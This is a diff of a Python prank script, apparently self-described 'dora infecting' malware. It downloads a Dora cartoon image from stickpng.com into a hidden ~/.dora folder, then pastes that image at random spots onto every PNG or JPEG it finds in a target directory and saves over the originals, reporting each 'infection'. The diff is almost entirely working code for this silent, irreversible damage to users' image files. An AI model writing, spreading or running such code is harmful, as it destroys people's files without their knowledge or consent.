@@ -9,8 +9,7 @@ from pathlib import Path
 import random
 import glob
 
-# img
-# http://assets.stickpng.com/images/580b57fbd9996e24bc43bd3e.png
+import requests
 
 gh_path = "/.dora"
 while True:
@@ -24,12 +23,20 @@ while True:
         os.makedirs(str(Path.home()) + gh_path)
         break
 
-home_fl = str(Path.home() + gh_path)
-path = ""
-img_path = ""
+home_fl = str(Path.home()) + gh_path
+dora_img_path = f"{home_fl}/dora.png"
+
+print("Downloading image from https://assets.stickpng.com/images/580b57fbd9996e24bc43bd3e.png...")
+dd_img_b = requests.get("https://assets.stickpng.com/images/580b57fbd9996e24bc43bd3e.png")
+print("Download successful")
+with open(dora_img_path, "wb") as f:
+    f.write(dd_img_b.content)
+dd_img_b.close()
+
+imgs_path = ""
 
 # mediocre capitalization format generator thingy
-ff = [f"{path}/*.png", f"{path}/*.PNG", f"{path}/*.JPG", f"{path}/*.jpg", f"{path}/*.jpeg", f"{path}/*.JPEG"]
+ff = [f"{imgs_path}/*.png", f"{imgs_path}/*.PNG", f"{imgs_path}/*.JPG", f"{imgs_path}/*.jpg", f"{imgs_path}/*.jpeg", f"{imgs_path}/*.JPEG"]
 formats = ["png", "jpg", "jpeg"]
 for i in formats:
     for x in range(len(i)):
@@ -40,14 +47,15 @@ for i in formats:
                 neww += y.upper()
             else:
                 neww += y
-        ff.append(f"{path}/*." + neww)
+        ff.append(f"{imgs_path}/*." + neww)
 
 posfil = []
 for i in ff:
     for x in glob.glob(i):
         posfil.append(x)
 
-dora = Image.open(img_path)
+# dora infecting ;)
+dora = Image.open(dora_img_path)
 for i in posfil:
     v_img = Image.open(i)
 
@@ -68,4 +76,4 @@ for i in posfil:
 
     v_img.paste(temp_dora, (random.randrange(0, v_img.size[0]), random.randrange(0, v_img.size[1])), mask_im_blur)
     v_img.save(i, quality=95)
-    print(f"Infection on {i} was successfull")
+    print(f"Infection on {i} was successful")
